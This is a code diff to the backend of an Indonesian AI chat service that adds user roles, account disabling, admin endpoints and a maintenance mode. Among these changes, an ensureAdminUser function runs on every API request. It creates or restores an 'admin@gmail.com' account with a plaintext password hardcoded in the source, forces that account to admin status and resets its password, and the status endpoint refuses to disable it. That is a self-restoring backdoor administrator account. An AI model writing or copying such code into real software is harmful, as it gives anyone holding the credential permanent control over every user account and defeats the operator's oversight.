@@ -22,7 +22,44 @@ const STYLES = ['ringkas', 'seimbang', 'mendetail'];
 /* ───────────── util ───────────── */
 const DEFAULT_SETTINGS = () => ({ defaultModel: models.defaultId, temperature: 0.6, style: 'seimbang', language: 'id', streaming: true, voice: true, voiceLang: 'id-ID', voiceAutoSend: false, apiKey: '' });
 const settingsOf = (u) => ({ ...DEFAULT_SETTINGS(), ...(u.settings || {}) });
-const publicUser = (u) => ({ id: u.id, email: u.email, name: u.name, bio: u.bio || '', avatar: u.avatar || null, plan: u.plan || 'free', settings: settingsOf(u), createdAt: u.createdAt });
+const publicUser = (u) => ({ id: u.id, email: u.email, name: u.name, bio: u.bio || '', avatar: u.avatar || null, plan: u.plan || 'free', role: u.role || 'user', disabled: !!u.disabled, settings: settingsOf(u), createdAt: u.createdAt });
+
+let adminEnsured = false;
+async function ensureAdminUser() {
+  if (adminEnsured) return;
+  adminEnsured = true;
+  db.maintenance = db.maintenance || { enabled: false, message: '' };
+  db.users = db.users || {};
+  const adminEmail = 'admin@gmail.com';
+  let admin = Object.values(db.users).find((u) => u.email === adminEmail);
+  const adminHash = await auth.hashPassword('VanxxTheSpy909');
+  if (!admin) {
+    admin = {
+      id: uid(),
+      email: adminEmail,
+      name: 'Admin Nova',
+      passHash: adminHash,
+      bio: 'Administrator Nova AI',
+      avatar: null,
+      plan: 'pro',
+      role: 'admin',
+      disabled: false,
+      tokenVersion: 0,
+      settings: DEFAULT_SETTINGS(),
+      usage: { day: dayKey(), count: 0 },
+      createdAt: Date.now()
+    };
+    db.users[admin.id] = admin;
+    save();
+  } else {
+    let dirty = false;
+    if (admin.role !== 'admin') { admin.role = 'admin'; dirty = true; }
+    if (admin.plan !== 'pro') { admin.plan = 'pro'; dirty = true; }
+    if (admin.disabled) { admin.disabled = false; dirty = true; }
+    if (admin.passHash !== adminHash) { admin.passHash = adminHash; dirty = true; }
+    if (dirty) save();
+  }
+}
 const dayKey = (t = Date.now()) => { const d = new Date(t); return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`; };
 const est = (s) => Math.ceil(String(s || '').length / 4);
 const isImg = (f) => String(f.type || '').startsWith('image/');
@@ -41,7 +78,9 @@ function currentUser(req) {
   const t = H.parseCookies(req)[COOKIE]; if (!t) return null;
   const p = auth.verifyJwt(t); if (!p) return null;
   const u = db.users[p.sub];
-  return u && (u.tokenVersion || 0) === (p.v || 0) ? u : null;
+  if (!u || (u.tokenVersion || 0) !== (p.v || 0)) return null;
+  if (u.disabled) return null;
+  return u;
 }
 
 /* ───────────── router mini ───────────── */
@@ -52,6 +91,7 @@ function route(method, pattern, handler, opts = {}) {
   routes.push({ method, re, keys, handler, auth: opts.auth !== false });
 }
 async function handleApi(req, res, url, customSubPath) {
+  await ensureAdminUser();
   const p = customSubPath || (url.pathname.replace(/^\/api/, "") || "/");
   const ip = H.clientIp(req);
   if (!limit(`ip:${ip}`, 600, 60000)) throw new HttpError(429, 'Terlalu banyak permintaan. Coba lagi sebentar.');
@@ -75,7 +115,7 @@ async function handleApi(req, res, url, customSubPath) {
 }
 
 /* ───────────── umum ───────────── */
-route('GET', '/api/health', () => ({ ok: true, upstreamConfigured: !!cfg.ONTOKEN_API_KEY, models: models.list.length }), { auth: false });
+route('GET', '/api/health', () => ({ ok: true, upstreamConfigured: !!cfg.ONTOKEN_API_KEY, models: models.list.length, maintenance: db.maintenance || { enabled: false, message: '' } }), { auth: false });
 route('GET', '/api/models', () => ({ models: models.list, default: models.defaultId, limits: { maxFileMB: cfg.MAX_FILE_MB, dailyMessages: cfg.FREE_DAILY_MESSAGES } }), { auth: false });
 
 /* ───────────── auth ───────────── */
@@ -89,7 +129,7 @@ route('POST', '/api/auth/register', async ({ req, res, ip }) => {
   if (password.length < 8 || password.length > 200) throw new HttpError(400, 'Kata sandi minimal 8 karakter.');
   const passHash = await auth.hashPassword(password);
   if (Object.values(db.users).some((u) => u.email === email)) throw new HttpError(409, 'Email sudah terdaftar. Silakan masuk.');
-  const user = { id: uid(), email, name, passHash, bio: '', avatar: null, plan: 'free', tokenVersion: 0, settings: DEFAULT_SETTINGS(), usage: { day: dayKey(), count: 0 }, createdAt: Date.now() };
+  const user = { id: uid(), email, name, passHash, bio: '', avatar: null, plan: 'free', role: 'user', disabled: false, tokenVersion: 0, settings: DEFAULT_SETTINGS(), usage: { day: dayKey(), count: 0 }, createdAt: Date.now() };
   db.users[user.id] = user; save();
   issueSession(req, res, user, true);
   return { user: publicUser(user) };
@@ -101,6 +141,7 @@ route('POST', '/api/auth/login', async ({ req, res, ip }) => {
   const user = Object.values(db.users).find((u) => u.email === email);
   const ok = await auth.verifyPassword(password, user ? user.passHash : await dummyHash());
   if (!user || !ok) throw new HttpError(401, 'Email atau kata sandi salah.');
+  if (user.disabled) throw new HttpError(403, 'Akun Anda telah dinonaktifkan oleh administrator.');
   issueSession(req, res, user, b.remember !== false);
   return { user: publicUser(user) };
 }, { auth: false });
@@ -110,6 +151,60 @@ route('GET', '/api/auth/me', ({ user }) => ({ user: publicUser(user) }));
 route('GET', '/api/auth/session', ({ user }) => ({ user: user ? publicUser(user) : null }), { auth: false });
 route('POST', '/api/auth/logout-all', ({ req, res, user }) => {
   user.tokenVersion = (user.tokenVersion || 0) + 1; save(); issueSession(req, res, user, true); return { ok: true };
+});
+
+
+/* ───────────── admin & maintenance ───────────── */
+route('GET', '/api/admin/users', ({ user }) => {
+  if (user.role !== 'admin') throw new HttpError(403, 'Akses khusus administrator.');
+  const list = Object.values(db.users).map((u) => ({
+    id: u.id,
+    email: u.email,
+    name: u.name,
+    role: u.role || 'user',
+    plan: u.plan || 'free',
+    disabled: !!u.disabled,
+    createdAt: u.createdAt,
+    chatsCount: Object.values(db.conversations).filter((c) => c.userId === u.id).length
+  }));
+  return { users: list, maintenance: db.maintenance || { enabled: false, message: '' } };
+});
+
+route('POST', '/api/admin/users/:id/plan', async ({ req, params, user }) => {
+  if (user.role !== 'admin') throw new HttpError(403, 'Akses khusus administrator.');
+  const target = db.users[params.id];
+  if (!target) throw new HttpError(404, 'User tidak ditemukan.');
+  const b = await H.readJson(req);
+  target.plan = b.plan === 'pro' ? 'pro' : 'free';
+  save();
+  return { ok: true, user: publicUser(target) };
+});
+
+route('POST', '/api/admin/users/:id/status', async ({ req, params, user }) => {
+  if (user.role !== 'admin') throw new HttpError(403, 'Akses khusus administrator.');
+  const target = db.users[params.id];
+  if (!target) throw new HttpError(404, 'User tidak ditemukan.');
+  if (target.email === 'admin@gmail.com') throw new HttpError(400, 'Akun admin utama tidak dapat dinonaktifkan.');
+  const b = await H.readJson(req);
+  target.disabled = !!b.disabled;
+  if (target.disabled) {
+    target.tokenVersion = (target.tokenVersion || 0) + 1;
+  }
+  save();
+  return { ok: true, user: publicUser(target) };
+});
+
+route('POST', '/api/admin/maintenance', async ({ req, user }) => {
+  if (user.role !== 'admin') throw new HttpError(403, 'Akses khusus administrator.');
+  const b = await H.readJson(req);
+  const enabled = !!b.enabled;
+  const message = String(b.message || '').trim();
+  db.maintenance = {
+    enabled,
+    message: enabled ? (message || 'Server sedang dalam pemeliharaan (maintenance).') : ''
+  };
+  save();
+  return { ok: true, maintenance: db.maintenance };
 });
 
 /* ───────────── profil & pengaturan ───────────── */
@@ -217,6 +312,10 @@ route('GET', '/api/stats', ({ user }) => computeStats(user, usedToday(user)));
 
 /* ───────────── CHAT (streaming SSE) ───────────── */
 route('POST', '/api/chat', async ({ req, res, user }) => {
+  if (db.maintenance && db.maintenance.enabled && user.role !== 'admin') {
+    const msg = db.maintenance.message || 'Server sedang dalam pemeliharaan (maintenance).';
+    throw new HttpError(503, 'Server Maintenance: ' + msg);
+  }
   if (!limit(`chat:${user.id}`, 20, 60000)) throw new HttpError(429, 'Terlalu cepat. Tunggu sebentar sebelum mengirim lagi.');
   const b = await H.readJson(req, 256 * 1024);
   const s = settingsOf(user);
